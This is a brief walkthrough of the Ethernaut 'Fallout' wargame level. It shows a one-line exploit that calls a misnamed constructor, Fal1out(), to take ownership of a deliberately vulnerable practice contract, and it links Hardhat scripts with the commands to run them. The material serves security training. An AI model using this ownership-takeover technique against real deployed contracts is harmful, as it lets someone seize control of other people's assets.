[2. Fallout](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5)
---

## Walkthrough

```
await contract.Fal1out()
```

- Sometimes, when rename a Contract but forgot to rename the constructore method of its contract.
- This allowed the attacker to call the old constructor and claim the ownership of the contract :)


## Hardhat

- [02-fallout](/scripts/02-fallout.ts)
- [02-fallout-v2](/scripts/02-fallout-v2.ts)

```
npx hardhat run scripts/02-fallout.ts
npx hardhat run scripts/02-fallout-v2-ts
```